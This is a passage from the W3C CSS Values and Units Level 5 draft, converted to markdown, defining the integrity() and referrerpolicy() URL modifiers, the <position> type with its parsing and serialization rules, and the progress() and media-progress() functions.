<a id="ref-for-typedef-request-url-modifier-integrity-modifier②"></a>

<a id="typedef-request-url-modifier-integrity-modifier"></a>[\<integrity-modifier\>](#typedef-request-url-modifier-integrity-modifier) = <a id="funcdef-request-url-modifier-integrity"></a>integrity([\<string\>](https://www.w3.org/TR/css-values-4/#string-value))

<a id="ref-for-string-value⑤"></a>

<a id="ref-for-concept-request-integrity-metadata"></a>

<a id="ref-for-concept-request④"></a>

<a id="ref-for-url-request-modifier-steps②"></a>

The [URL request modifier steps](https://www.w3.org/TR/css-values-4/#url-request-modifier-steps) for this modifier given [request](https://fetch.spec.whatwg.org/#concept-request) <var>req</var> are to set <a id="ref-for-concept-request⑤"></a>request's [integrity metadata](https://fetch.spec.whatwg.org/#concept-request-integrity-metadata) to the given [\<string\>](https://www.w3.org/TR/css-values-4/#string-value).

<a id="ref-for-typedef-request-url-modifier-referrerpolicy-modifier②"></a>

<a id="typedef-request-url-modifier-referrerpolicy-modifier"></a>[\<referrerpolicy-modifier\>](#typedef-request-url-modifier-referrerpolicy-modifier) = <a id="funcdef-request-url-modifier-referrerpolicy"></a>referrerpolicy(<a id="valdef-request-url-modifier-no-referrer"></a>no-referrer \| <a id="valdef-request-url-modifier-no-referrer-when-downgrade"></a>no-referrer-when-downgrade \| <a id="valdef-request-url-modifier-same-origin"></a>same-origin \| <a id="valdef-request-url-modifier-origin"></a>origin \| <a id="valdef-request-url-modifier-strict-origin"></a>strict-origin \| <a id="valdef-request-url-modifier-origin-when-cross-origin"></a>origin-when-cross-origin \| <a id="valdef-request-url-modifier-strict-origin-when-cross-origin"></a>strict-origin-when-cross-origin \| <a id="valdef-request-url-modifier-unsafe-url"></a>unsafe-url)

<a id="ref-for-enumdef-referrerpolicy"></a>

<a id="ref-for-concept-request-referrer-policy"></a>

<a id="ref-for-concept-request⑥"></a>

<a id="ref-for-url-request-modifier-steps③"></a>

The [URL request modifier steps](https://www.w3.org/TR/css-values-4/#url-request-modifier-steps) for this modifier given [request](https://fetch.spec.whatwg.org/#concept-request) <var>req</var> are to set <a id="ref-for-concept-request⑦"></a>request's [referrer policy](https://fetch.spec.whatwg.org/#concept-request-referrer-policy) to the <code><a href="https://www.w3.org/TR/referrer-policy/#enumdef-referrerpolicy">ReferrerPolicy</a></code> that matches the given value.

<a id="ref-for-concept-request⑧"></a>

<a id="ref-for-url-value②"></a>

<a id="ref-for-url-request-modifier-steps④"></a>

<a id="ref-for-typedef-request-url-modifier③"></a>

To <a id="apply-request-modifiers-from-url-value"></a>apply request modifiers from URL value given a [request](https://fetch.spec.whatwg.org/#concept-request) <var>req</var> and a [\<url\>](https://www.w3.org/TR/css-values-4/#url-value) <var>url</var>, call the [URL request modifier steps](https://www.w3.org/TR/css-values-4/#url-request-modifier-steps) for <var>url</var>’s [\<request-url-modifier\>](#typedef-request-url-modifier)s in sequence given <var>req</var>.

<a id="ref-for-typedef-position"></a>

### <a id="position"></a>4.2.  2D Positioning: the [\<position\>](#typedef-position) type

<a id="ref-for-typedef-position①"></a>

<a id="ref-for-alignment-subject"></a>

<a id="ref-for-alignment-container"></a>

<a id="ref-for-background-positioning-area"></a>

The <a id="typedef-position"></a>[\<position\>](#typedef-position) value specifies the position of an [alignment subject](https://www.w3.org/TR/css-align-3/#alignment-subject) (e.g. a background image) inside an [alignment container](https://www.w3.org/TR/css-align-3/#alignment-container) (e.g. its [background positioning area](https://drafts.csswg.org/css-backgrounds-3/#background-positioning-area)) as a pair of offsets between the specified edges (defaulting to the left and top). Its syntax is:

<a id="ref-for-typedef-position②"></a>

<a id="ref-for-typedef-position-one"></a>

<a id="ref-for-comb-one③⑦"></a>

<a id="ref-for-typedef-position-two"></a>

<a id="ref-for-comb-one③⑧"></a>

<a id="ref-for-typedef-position-four"></a>

<a id="typedef-position-one"></a>

<a id="ref-for-typedef-position-one①"></a>

<a id="ref-for-comb-one③⑨"></a>

<a id="ref-for-comb-one④⓪"></a>

<a id="ref-for-comb-one④①"></a>

<a id="ref-for-comb-one④②"></a>

<a id="ref-for-comb-one④③"></a>

<a id="ref-for-comb-one④④"></a>

<a id="ref-for-comb-one④⑤"></a>

<a id="ref-for-comb-one④⑥"></a>

<a id="ref-for-comb-one④⑦"></a>

<a id="ref-for-comb-one④⑧"></a>

<a id="ref-for-comb-one④⑨"></a>

<a id="ref-for-comb-one⑤⓪"></a>

<a id="ref-for-comb-one⑤①"></a>

<a id="ref-for-typedef-length-percentage"></a>

<a id="typedef-position-two"></a>

<a id="ref-for-typedef-position-two①"></a>

<a id="ref-for-comb-one⑤②"></a>

<a id="ref-for-comb-one⑤③"></a>

<a id="ref-for-comb-one⑤④"></a>

<a id="ref-for-comb-one⑤⑤"></a>

<a id="ref-for-comb-all"></a>

<a id="ref-for-comb-one⑤⑥"></a>

<a id="ref-for-comb-one⑤⑦"></a>

<a id="ref-for-comb-one⑤⑧"></a>

<a id="ref-for-comb-one⑤⑨"></a>

<a id="ref-for-comb-one⑥⓪"></a>

<a id="ref-for-comb-one⑥①"></a>

<a id="ref-for-comb-one⑥②"></a>

<a id="ref-for-comb-one⑥③"></a>

<a id="ref-for-comb-one⑥④"></a>

<a id="ref-for-comb-one⑥⑤"></a>

<a id="ref-for-typedef-length-percentage①"></a>

<a id="ref-for-comb-one⑥⑥"></a>

<a id="ref-for-comb-one⑥⑦"></a>

<a id="ref-for-comb-one⑥⑧"></a>

<a id="ref-for-comb-one⑥⑨"></a>

<a id="ref-for-comb-one⑦⓪"></a>

<a id="ref-for-typedef-length-percentage②"></a>

<a id="ref-for-comb-one⑦①"></a>

<a id="ref-for-comb-one⑦②"></a>

<a id="ref-for-comb-one⑦③"></a>

<a id="ref-for-comb-all①"></a>

<a id="ref-for-comb-one⑦④"></a>

<a id="ref-for-comb-one⑦⑤"></a>

<a id="ref-for-comb-one⑦⑥"></a>

<a id="ref-for-comb-one⑦⑦"></a>

<a id="ref-for-comb-one⑦⑧"></a>

<a id="ref-for-mult-num"></a>

<a id="typedef-position-four"></a>

<a id="ref-for-typedef-position-four①"></a>

<a id="ref-for-comb-one⑦⑨"></a>

<a id="ref-for-comb-one⑧⓪"></a>

<a id="ref-for-comb-one⑧①"></a>

<a id="ref-for-typedef-length-percentage③"></a>

<a id="ref-for-comb-all②"></a>

<a id="ref-for-comb-one⑧②"></a>

<a id="ref-for-comb-one⑧③"></a>

<a id="ref-for-comb-one⑧④"></a>

<a id="ref-for-typedef-length-percentage④"></a>

<a id="ref-for-comb-one⑧⑤"></a>

<a id="ref-for-comb-one⑧⑥"></a>

<a id="ref-for-typedef-length-percentage⑤"></a>

<a id="ref-for-comb-all③"></a>

<a id="ref-for-comb-one⑧⑦"></a>

<a id="ref-for-typedef-length-percentage⑥"></a>

<a id="ref-for-comb-one⑧⑧"></a>

<a id="ref-for-comb-one⑧⑨"></a>

<a id="ref-for-typedef-length-percentage⑦"></a>

<a id="ref-for-mult-num①"></a>

```text
<position> = <position-one> | <position-two> | <position-four>
<position-one> = [
  left | center | right | top | bottom |
  x-start | x-end | y-start | y-end |
  block-start | block-end | inline-start | inline-end |
  <length-percentage>
]
<position-two> = [
  [ left | center | right | x-start | x-end ] &&
  [ top | center | bottom | y-start | y-end ]
|
  [ left | center | right | x-start | x-end | <length-percentage> ]
  [ top | center | bottom | y-start | y-end | <length-percentage> ]
|
  [ block-start | center | block-end ] &&
  [ inline-start | center | inline-end ]
|
  [ start | center | end ]{2}
]
<position-four> = [
  [ [ left | right | x-start | x-end ] <length-percentage> ] &&
  [ [ top | bottom | y-start | y-end ] <length-percentage> ]
|
  [ [ block-start | block-end ] <length-percentage> ] &&
  [ [ inline-start | inline-end ] <length-percentage> ]
|
  [ [ start | end ] <length-percentage> ]{2}
]
```
<a id="ref-for-typedef-position-one②"></a>

<a id="ref-for-valdef-position-center"></a>

If only one value is specified ([\<position-one\>](#typedef-position-one)), the second value is assumed to be [center](#valdef-position-center).

<a id="ref-for-typedef-position-two②"></a>

<a id="ref-for-typedef-length-percentage⑧"></a>

<a id="ref-for-alignment-subject①"></a>

<a id="ref-for-alignment-container①"></a>

If two values are given ([\<position-two\>](#typedef-position-two)), a [\<length-percentage\>](https://www.w3.org/TR/css-values-4/#typedef-length-percentage) as the first value represents the horizontal position as the offset between the left edges of the [alignment subject](https://www.w3.org/TR/css-align-3/#alignment-subject) and [alignment container](https://www.w3.org/TR/css-align-3/#alignment-container), and a <a id="ref-for-typedef-length-percentage⑨"></a>\<length-percentage\> as the second value represents the vertical position as an offset between their top edges.

<a id="ref-for-block-axis"></a>

<a id="ref-for-inline-axis"></a>

If both keywords are one of start or end, the first one represents the [block axis](https://www.w3.org/TR/css-writing-modes-4/#block-axis) and the second the [inline axis](https://www.w3.org/TR/css-writing-modes-4/#inline-axis).

> <strong data-conversion-semantic="note">Note</strong>
>
> Note: A pair of axis-specific keywords can be reordered, while a combination of keyword and length or percentage cannot. So center left or inline-start block-end is valid, while 50% left is not. start and end aren’t axis-specific, so start end and end start represent two different positions.

<a id="ref-for-typedef-position-four②"></a>

<a id="ref-for-typedef-length-percentage①⓪"></a>

<a id="ref-for-propdef-background-position"></a>

If four values are given ([\<position-four\>](#typedef-position-four)) then each [\<length-percentage\>](https://www.w3.org/TR/css-values-4/#typedef-length-percentage) represents an offset between the edges specified by the preceding keyword. For example, [background-position: bottom 10px right 20px](https://www.w3.org/TR/css-backgrounds-3/#propdef-background-position) represents a 10px vertical offset up from the bottom edge and a 20px horizontal offset leftward from the right edge.

<a id="ref-for-alignment-container②"></a>

Positive values represent an offset <em>inward</em> from the edge of the [alignment container](https://www.w3.org/TR/css-align-3/#alignment-container). Negative values represent an offset <em>outward</em> from the edge of the <a id="ref-for-alignment-container③"></a>alignment container.

> <strong data-conversion-semantic="example">Example</strong>
>
> <a id="example-0b808127"></a> The following declarations give the stated (horizontal, vertical) offsets from the top left corner:
>
> ```text
> background-position: left 10px top 15px;   /* 10px, 15px */
> background-position: left      top     ;   /*  0px,  0px */
> background-position:      10px     15px;   /* 10px, 15px */
> background-position: left          15px;   /*  0px, 15px */
> background-position:      10px top     ;   /* 10px,  0px */
> ```
<a id="ref-for-typedef-position③"></a>

> <strong data-conversion-semantic="example">Example</strong>
>
> <a id="example-88922ca3"></a> [\<position\>](#typedef-position)s can also be relative to other corners than the top left. For example, the following puts the background image 10px from the bottom and 3em from the right:
>
> ```text
> background-position: right 3em bottom 10px
> ```
<a id="ref-for-computed-value①"></a>

<a id="ref-for-typedef-position④"></a>

<a id="ref-for-typedef-length-percentage①①"></a>

<a id="ref-for-alignment-subject②"></a>

<a id="ref-for-alignment-container④"></a>

The [computed value](https://www.w3.org/TR/css-cascade-5/#computed-value) of a [\<position\>](#typedef-position) is a pair of offsets (horizontal and vertical), each given as a computed [\<length-percentage\>](https://www.w3.org/TR/css-values-4/#typedef-length-percentage) value, representing the distance between the left edges and top edges (respectively) of the [alignment subject](https://www.w3.org/TR/css-align-3/#alignment-subject) and [alignment container](https://www.w3.org/TR/css-align-3/#alignment-container).

<a id="ref-for-typedef-length-percentage①②"></a>

<a id="valdef-position-length-percentage"></a>[\<length-percentage\>](https://www.w3.org/TR/css-values-4/#typedef-length-percentage)

<a id="ref-for-alignment-container⑤"></a>

<a id="ref-for-alignment-subject③"></a>

<a id="ref-for-typedef-length-percentage①③"></a>

A [\<length-percentage\>](https://www.w3.org/TR/css-values-4/#typedef-length-percentage) value specifies the size of the offset between the specified edges of the [alignment subject](https://www.w3.org/TR/css-align-3/#alignment-subject) and [alignment container](https://www.w3.org/TR/css-align-3/#alignment-container).

<a id="ref-for-propdef-background-position①"></a>

<a id="ref-for-background-positioning-area①"></a>

For example, for [background-position: 2cm 1cm](https://www.w3.org/TR/css-backgrounds-3/#propdef-background-position), the top left corner of the background image is placed 2cm to the right and 1cm below the top left corner of the [background positioning area](https://drafts.csswg.org/css-backgrounds-3/#background-positioning-area).

<a id="ref-for-percentage-value①"></a>

<a id="ref-for-alignment-container⑥"></a>

<a id="ref-for-alignment-subject④"></a>

<a id="ref-for-alignment-container⑦"></a>

<a id="ref-for-alignment-subject⑤"></a>

A [\<percentage\>](https://www.w3.org/TR/css-values-4/#percentage-value) for the horizontal offset is relative to (<var>width of <a href="https://www.w3.org/TR/css-align-3/#alignment-container">alignment container</a></var> - <var>width of <a href="https://www.w3.org/TR/css-align-3/#alignment-subject">alignment subject</a></var>). A <a id="ref-for-percentage-value②"></a>\<percentage\> for the vertical offset is relative to (<var>height of <a href="https://www.w3.org/TR/css-align-3/#alignment-container">alignment container</a></var> - <var>height of <a href="https://www.w3.org/TR/css-align-3/#alignment-subject">alignment subject</a></var>).

<a id="ref-for-alignment-subject⑥"></a>

<a id="ref-for-alignment-container⑧"></a>

> <strong data-conversion-semantic="example">Example</strong>
>
> <a id="example-0fd7dab3"></a> For example, with a value pair of 0% 0%, the upper left corner of the [alignment subject](https://www.w3.org/TR/css-align-3/#alignment-subject) is aligned with the upper left corner of the [alignment container](https://www.w3.org/TR/css-align-3/#alignment-container) A value pair of 100% 100% places the lower right corner of the <a id="ref-for-alignment-subject⑦"></a>alignment subject in the lower right corner of the <a id="ref-for-alignment-container⑨"></a>alignment container. With a value pair of 75% 50%, the point 75% across and 50% down the <a id="ref-for-alignment-subject⑧"></a>alignment subject is to be placed at the point 75% across and 50% down the <a id="ref-for-alignment-container①⓪"></a>alignment container.
>
> ![Diagram of image position within element](https://www.w3.org/TR/2024/WD-css-values-5-20241111/images/bg-pos.png)
>
> <a id="ref-for-propdef-background-position②"></a>
>
> Diagram of the meaning of [background-position: 75% 50%](https://www.w3.org/TR/css-backgrounds-3/#propdef-background-position).

<a id="valdef-position-top"></a>top

<a id="valdef-position-right"></a>right

<a id="valdef-position-bottom"></a>bottom

<a id="valdef-position-left"></a>left

<a id="ref-for-alignment-container①①"></a>

<a id="ref-for-alignment-subject⑨"></a>

Offsets the top/left/right/bottom edges (respectively) of the [alignment subject](https://www.w3.org/TR/css-align-3/#alignment-subject) and [alignment container](https://www.w3.org/TR/css-align-3/#alignment-container) by the specified amount (defaulting to 0%) in the corresponding axis.

<a id="valdef-position-y-start"></a>y-start

<a id="valdef-position-y-end"></a>y-end

<a id="valdef-position-x-start"></a>x-start

<a id="valdef-position-x-end"></a>x-end

<a id="ref-for-x-axis"></a>

<a id="ref-for-end"></a>

<a id="ref-for-start"></a>

Computes the same as the physical edge keyword corresponding to the [start](https://www.w3.org/TR/css-writing-modes-4/#start)/[end](https://www.w3.org/TR/css-writing-modes-4/#end) side in the \[=y-axis\|y/[x](https://www.w3.org/TR/css-writing-modes-4/#x-axis) axis.

<a id="valdef-position-block-start"></a>block-start

<a id="valdef-position-block-end"></a>block-end

<a id="valdef-position-inline-start"></a>inline-start

<a id="valdef-position-inline-end"></a>inline-end

<a id="ref-for-inline-axis①"></a>

<a id="ref-for-block-axis①"></a>

<a id="ref-for-end①"></a>

<a id="ref-for-start①"></a>

Computes the same as the physical edge keyword corresponding to the [start](https://www.w3.org/TR/css-writing-modes-4/#start)/[end](https://www.w3.org/TR/css-writing-modes-4/#end) side in the [block](https://www.w3.org/TR/css-writing-modes-4/#block-axis)/[inline](https://www.w3.org/TR/css-writing-modes-4/#inline-axis) axis.

<a id="valdef-position-center"></a>center

Computes to a 50% offset in the corresponding axis.

<a id="ref-for-flow-relative"></a>

<a id="ref-for-writing-mode"></a>

Unless otherwise specified, the [flow-relative](https://www.w3.org/TR/css-writing-modes-4/#flow-relative) keywords are resolved according to the [writing mode](https://www.w3.org/TR/css-writing-modes-4/#writing-mode) of the element on which the value is specified.

<a id="ref-for-propdef-background-position③"></a>

> <strong data-conversion-semantic="note">Note</strong>
>
> Note: The [background-position](https://www.w3.org/TR/css-backgrounds-3/#propdef-background-position) property also accepts a three-value syntax. This has been disallowed generically because it creates parsing ambiguities when combined with other length or percentage components in a property value.

<a id="ref-for-propdef-background-position④"></a>

<a id="ref-for-funcdef-var②"></a>

> <strong data-conversion-semantic="issue">Issue</strong>
>
> <a id="issue-8e940682"></a> Need to define how this syntax would expand to the longhands of [background-position](https://www.w3.org/TR/css-backgrounds-3/#propdef-background-position) if e.g. [var()](https://www.w3.org/TR/css-variables-1/#funcdef-var) is used for some (or all) of the components. [\[Issue \#9690\]](https://github.com/w3c/csswg-drafts/issues/9690)

<a id="ref-for-typedef-position⑤"></a>

#### <a id="position-parsing"></a>4.2.1.  Parsing [\<position\>](#typedef-position)

<a id="ref-for-length-value①"></a>

<a id="ref-for-percentage-value③"></a>

<a id="ref-for-typedef-position⑥"></a>

When specified in a grammar alongside other keywords, [\<length\>](https://www.w3.org/TR/css-values-4/#length-value)s, or [\<percentage\>](https://www.w3.org/TR/css-values-4/#percentage-value)s, [\<position\>](#typedef-position) is <em>greedily</em> parsed; it consumes as many components as possible.

<a id="ref-for-propdef-transform-origin"></a>

<a id="ref-for-typedef-position⑦"></a>

<a id="ref-for-length-value②"></a>

> <strong data-conversion-semantic="example">Example</strong>
>
> <a id="example-2622a7d7"></a> For example, [transform-origin](https://www.w3.org/TR/css-transforms-1/#propdef-transform-origin) defines a 3D position as (effectively) \<position\> \<length\>?. A value such as left 50px will be parsed as a 2-value [\<position\>](#typedef-position), with an omitted z-component; on the other hand, a value such as top 50px will be parsed as a single-value <a id="ref-for-typedef-position⑧"></a>\<position\> followed by a [\<length\>](https://www.w3.org/TR/css-values-4/#length-value).

<a id="ref-for-typedef-position⑨"></a>

#### <a id="position-serialization"></a>4.2.2.  Serializing [\<position\>](#typedef-position)

<a id="ref-for-specified-value"></a>

<a id="ref-for-typedef-position①⓪"></a>

When serializing the [specified value](https://www.w3.org/TR/css-cascade-5/#specified-value) of a [\<position\>](#typedef-position):

If only one component is specified:  
- <a id="ref-for-valdef-background-position-center"></a>

  The implied [center](https://www.w3.org/TR/css-backgrounds-3/#valdef-background-position-center) keyword is added, and a 2-component value is serialized.

If two components are specified:  
- Keywords are serialized as keywords.

- <a id="ref-for-typedef-length-percentage①④"></a>

  [\<length-percentage\>](https://www.w3.org/TR/css-values-4/#typedef-length-percentage)s are serialized as <a id="ref-for-typedef-length-percentage①⑤"></a>\<length-percentage\>s.

- Components are serialized horizontal first, then vertical.

If four components are specified:  
- Keywords and offsets are both serialized.

- <a id="ref-for-block-axis②"></a>

  <a id="ref-for-inline-axis②"></a>

  Components are serialized horizontal first, then vertical; alternatively [block-axis](https://www.w3.org/TR/css-writing-modes-4/#block-axis) first, then [inline-axis](https://www.w3.org/TR/css-writing-modes-4/#inline-axis).

<a id="ref-for-typedef-position①①"></a>

<a id="ref-for-length-value③"></a>

<a id="ref-for-propdef-transform-origin①"></a>

> <strong data-conversion-semantic="note">Note</strong>
>
> Note: [\<position\>](#typedef-position) values are never serialized as a single value, even when a single value would produce the same behavior, to avoid causing parsing ambiguities in some grammars where a <a id="ref-for-typedef-position①②"></a>\<position\> is placed next to a [\<length\>](https://www.w3.org/TR/css-values-4/#length-value), such as [transform-origin](https://www.w3.org/TR/css-transforms-1/#propdef-transform-origin).

<a id="ref-for-computed-value②"></a>

<a id="ref-for-typedef-position①③"></a>

<a id="ref-for-typedef-length-percentage①⑥"></a>

The [computed value](https://www.w3.org/TR/css-cascade-5/#computed-value) of a [\<position\>](#typedef-position) is serialized as a pair of [\<length-percentage\>](https://www.w3.org/TR/css-values-4/#typedef-length-percentage)s representing offsets from the left and top edges, in that order.

<a id="ref-for-typedef-position①④"></a>

#### <a id="combine-positions"></a>4.2.3.  Combination of [\<position\>](#typedef-position)

<a id="ref-for-interpolation"></a>

<a id="ref-for-typedef-position①⑤"></a>

<a id="ref-for-typedef-length-percentage①⑦"></a>

[Interpolation](https://www.w3.org/TR/css-values-4/#interpolation) of [\<position\>](#typedef-position) is defined as the independent interpolation of each component (x, y) normalized as an offset from the top left corner as a [\<length-percentage\>](https://www.w3.org/TR/css-values-4/#typedef-length-percentage).

<a id="ref-for-addition"></a>

<a id="ref-for-typedef-position①⑥"></a>

<a id="ref-for-typedef-length-percentage①⑧"></a>

[Addition](https://www.w3.org/TR/css-values-4/#addition) of [\<position\>](#typedef-position) is likewise defined as the independent <a id="ref-for-addition①"></a>addition each component (x, y) normalized as an offset from the top left corner as a [\<length-percentage\>](https://www.w3.org/TR/css-values-4/#typedef-length-percentage).

## <a id="progress"></a>5.  Interpolation Progress Functional Notations

> <strong data-conversion-semantic="issue">Issue</strong>
>
> <a id="issue-a8c048ec"></a> This section is an exploratory draft, and not yet approved by the CSSWG. [\[Issue \#6245\]](https://github.com/w3c/csswg-drafts/issues/6245)

<a id="ref-for-funcdef-progress"></a>

<a id="ref-for-funcdef-media-progress"></a>

<a id="ref-for-funcdef-container-progress"></a>

<a id="ref-for-functional-notation②"></a>

<a id="ref-for-math-function"></a>

<a id="ref-for-media-feature"></a>

<a id="ref-for-container-feature"></a>

The [progress()](#funcdef-progress), [media-progress()](#funcdef-media-progress), and [container-progress()](#funcdef-container-progress) [functional notations](https://www.w3.org/TR/css-values-4/#functional-notation) represent the proportional distance of a given value (the <a id="progress-value"></a>progress value) from one value (the <a id="progress-start-value"></a>progress start value) to another value (the <a id="progress-end-value"></a>progress end value). They allow drawing a progress ratio from [math functions](https://www.w3.org/TR/css-values-4/#math-function), [media features](https://www.w3.org/TR/mediaqueries-5/#media-feature), and [container features](https://www.w3.org/TR/css-conditional-5/#container-feature), respectively, following a common syntactic pattern:

```text
progress-function() = progress-function( progress value from start value to end value )
```
<a id="ref-for-number-value①"></a>

<a id="ref-for-calculate-a-progress-function"></a>

Each resolves to a [\<number\>](https://www.w3.org/TR/css-values-4/#number-value) by [calculating a progress function](#calculate-a-progress-function).

<a id="ref-for-progress-value"></a>

<a id="ref-for-progress-start-value"></a>

<a id="ref-for-progress-end-value"></a>

To <a id="calculate-a-progress-function"></a>calculate a progress function, given a [progress value](#progress-value), [progress start value](#progress-start-value), and [progress end value](#progress-end-value):

<a id="ref-for-progress-end-value①"></a>

<a id="ref-for-progress-start-value①"></a>

If the [progress start value](#progress-start-value) and [progress end value](#progress-end-value) are different values

<a id="ref-for-progress-value①"></a>

<a id="ref-for-progress-start-value②"></a>

<a id="ref-for-progress-end-value②"></a>

<a id="ref-for-progress-start-value③"></a>

<code><c->(</c-><a href="#progress-value">progress value</a> - <a href="#progress-start-value">progress start value</a><c->)</c-> / <c->(</c-><a href="#progress-end-value">progress end value</a> - <span>progress start value</span><c->)</c-></code>.

<a id="ref-for-progress-end-value③"></a>

<a id="ref-for-progress-start-value④"></a>

If the [progress start value](#progress-start-value) and [progress end value](#progress-end-value) are the same value

<a id="ref-for-progress-value②"></a>

0, -∞, or +∞, depending on whether [progress value](#progress-value) is equal to, less than, or greater than the shared value.

<a id="ref-for-number-value②"></a>

<a id="ref-for-css-make-a-type-consistent"></a>

> <strong data-conversion-semantic="note">Note</strong>
>
> Note: The return value is a plain [\<number\>](https://www.w3.org/TR/css-values-4/#number-value), not [made consistent](https://www.w3.org/TR/css-values-4/#css-make-a-type-consistent) with its arguments by default.

<a id="ref-for-math-function①"></a>

<a id="ref-for-mix-notations"></a>

The resulting number can then be input into other calculations, such as a [math function](https://www.w3.org/TR/css-values-4/#math-function) or a [mix notation](#mix-notations).

<a id="ref-for-funcdef-progress①"></a>

### <a id="progress-func"></a>5.1.  Calculated Progress Values: the [progress()](#funcdef-progress) notation

<a id="ref-for-number-value③"></a>

<a id="ref-for-calc-calculation"></a>

<a id="ref-for-progress-value③"></a>

<a id="ref-for-progress-start-value⑤"></a>

<a id="ref-for-progress-end-value④"></a>

<a id="ref-for-funcdef-progress②"></a>

<a id="ref-for-math-function②"></a>

The <a id="funcdef-progress"></a>progress() functional notation returns a [\<number\>](https://www.w3.org/TR/css-values-4/#number-value) value representing the position of one [calculation](https://www.w3.org/TR/css-values-4/#calc-calculation) (the [progress value](#progress-value)) between two other <a id="ref-for-calc-calculation①"></a>calculations (the [progress start value](#progress-start-value) and [progress end value](#progress-end-value)). [progress()](#funcdef-progress) is a [math function](https://www.w3.org/TR/css-values-4/#math-function).

<a id="ref-for-funcdef-progress③"></a>

The syntax of [progress()](#funcdef-progress) is defined as follows:

<a id="typedef-progress-fn"></a>

<a id="ref-for-funcdef-progress④"></a>

<a id="ref-for-typedef-calc-sum"></a>

<a id="ref-for-comb-comma"></a>

<a id="ref-for-typedef-calc-sum①"></a>

<a id="ref-for-comb-comma①"></a>

<a id="ref-for-typedef-calc-sum②"></a>

```text
<progress()> = progress(<calc-sum>, <calc-sum>, <calc-sum>)
```
<a id="ref-for-typedef-calc-sum③"></a>

<a id="ref-for-progress-value④"></a>

<a id="ref-for-progress-start-value⑥"></a>

<a id="ref-for-progress-end-value⑤"></a>

where the first, second, and third [\<calc-sum\>](https://www.w3.org/TR/css-values-4/#typedef-calc-sum) values represent the [progress value](#progress-value), [progress start value](#progress-start-value), and [progress end value](#progress-end-value), respectively.

<a id="ref-for-calc-calculation②"></a>

<a id="ref-for-number-value④"></a>

<a id="ref-for-typedef-dimension"></a>

<a id="ref-for-percentage-value④"></a>

<a id="ref-for-css-consistent-type"></a>

The argument [calculations](https://www.w3.org/TR/css-values-4/#calc-calculation) can resolve to any [\<number\>](https://www.w3.org/TR/css-values-4/#number-value), [\<dimension\>](https://www.w3.org/TR/css-values-4/#typedef-dimension), or [\<percentage\>](https://www.w3.org/TR/css-values-4/#percentage-value), but must have a [consistent type](https://www.w3.org/TR/css-values-4/#css-consistent-type) or else the function is invalid.

<a id="ref-for-funcdef-progress⑤"></a>

<a id="ref-for-number-value⑤"></a>

<a id="ref-for-calculate-a-progress-function①"></a>

<a id="ref-for-css-make-a-type-consistent①"></a>

<a id="ref-for-css-consistent-type①"></a>

The value of [progress()](#funcdef-progress) is a [\<number\>](https://www.w3.org/TR/css-values-4/#number-value), determined by [calculating a progress function](#calculate-a-progress-function), then [made consistent](https://www.w3.org/TR/css-values-4/#css-make-a-type-consistent) with the [consistent type](https://www.w3.org/TR/css-values-4/#css-consistent-type) of its arguments.

> <strong data-conversion-semantic="issue">Issue</strong>
>
> <a id="issue-997f0423"></a> Do we need a percent-progress() notation, or do enough places auto-convert that it’s not necessary?

<a id="ref-for-funcdef-progress⑥"></a>

<a id="ref-for-funcdef-calc"></a>

<a id="ref-for-math-function③"></a>

> <strong data-conversion-semantic="note">Note</strong>
>
> Note: The [progress()](#funcdef-progress) function is essentially syntactic sugar for a particular pattern of [calc()](https://www.w3.org/TR/css-values-4/#funcdef-calc) notations, so it’s a [math function](https://www.w3.org/TR/css-values-4/#math-function).

<a id="ref-for-funcdef-media-progress①"></a>

### <a id="media-progress-func"></a>5.2.  Media Query Progress Values: the [media-progress()](#funcdef-media-progress) notation

<a id="ref-for-funcdef-progress⑦"></a>

<a id="ref-for-number-value⑥"></a>

<a id="ref-for-media-query①"></a>

<a id="ref-for-progress-value⑤"></a>

<a id="ref-for-progress-start-value⑦"></a>

<a id="ref-for-progress-end-value⑥"></a>

Similar to the [progress()](#funcdef-progress) notation, the <a id="funcdef-media-progress"></a>media-progress() functional notation returns a [\<number\>](https://www.w3.org/TR/css-values-4/#number-value) value representing current value of the specified [media query](https://www.w3.org/TR/mediaqueries-5/#media-query) [\[MEDIAQUERIES-4\]](#biblio-mediaqueries-4) as a [progress value](#progress-value) between two explicit values of the <a id="ref-for-media-query②"></a>media query (as the [progress start value](#progress-start-value) and [progress end value](#progress-end-value)).

<a id="ref-for-funcdef-media-progress②"></a>

The syntax of [media-progress()](#funcdef-media-progress) is defined as follows:

<a id="typedef-media-progress"></a>

<a id="ref-for-funcdef-media-progress③"></a>

<a id="ref-for-typedef-mf-name"></a>

<a id="ref-for-comb-comma②"></a>

<a id="ref-for-typedef-calc-sum④"></a>

<a id="ref-for-comb-comma③"></a>

<a id="ref-for-typedef-calc-sum⑤"></a>

```text
<media-progress()> = media-progress(<mf-name>, <calc-sum>, <calc-sum>)
```
<a id="ref-for-media-feature①"></a>

<a id="ref-for-typedef-mf-name①"></a>

<a id="ref-for-progress-value⑥"></a>

<a id="ref-for-typedef-calc-sum⑥"></a>

<a id="ref-for-progress-start-value⑧"></a>

<a id="ref-for-progress-end-value⑦"></a>

where the value of the [media feature](https://www.w3.org/TR/mediaqueries-5/#media-feature) corresponding to [\<mf-name\>](https://www.w3.org/TR/mediaqueries-5/#typedef-mf-name) represents the [progress value](#progress-value), and the two [\<calc-sum\>](https://www.w3.org/TR/css-values-4/#typedef-calc-sum) values represent the [progress start value](#progress-start-value) and [progress end value](#progress-end-value), respectively.

<a id="ref-for-media-feature②"></a>

<a id="ref-for-progress-start-value⑨"></a>

<a id="ref-for-progress-end-value⑧"></a>

<a id="ref-for-media-query③"></a>

<a id="ref-for-calc-calculation③"></a>

<a id="ref-for-css-consistent-type②"></a>

The specified [media feature](https://www.w3.org/TR/mediaqueries-5/#media-feature) must be a valid “range” type feature, the specified [progress start value](#progress-start-value) and [progress end value](#progress-end-value) must be valid values for the specified [media query](https://www.w3.org/TR/mediaqueries-5/#media-query), and both [calculation](https://www.w3.org/TR/css-values-4/#calc-calculation) values must have a [consistent type](https://www.w3.org/TR/css-values-4/#css-consistent-type), or else the function is invalid.

<a id="ref-for-progress-start-value①⓪"></a>

<a id="ref-for-progress-end-value⑨"></a>

<a id="ref-for-calc-calculation④"></a>

<a id="ref-for-media-feature③"></a>

The [progress start value](#progress-start-value) and [progress end value](#progress-end-value) [calculations](https://www.w3.org/TR/css-values-4/#calc-calculation) are interpreted as specified for the [media feature](https://www.w3.org/TR/mediaqueries-5/#media-feature) (rather than as specified by the context the function is used in).

<a id="ref-for-funcdef-media-progress④"></a>

<a id="ref-for-number-value⑦"></a>

<a id="ref-for-calculate-a-progress-function②"></a>

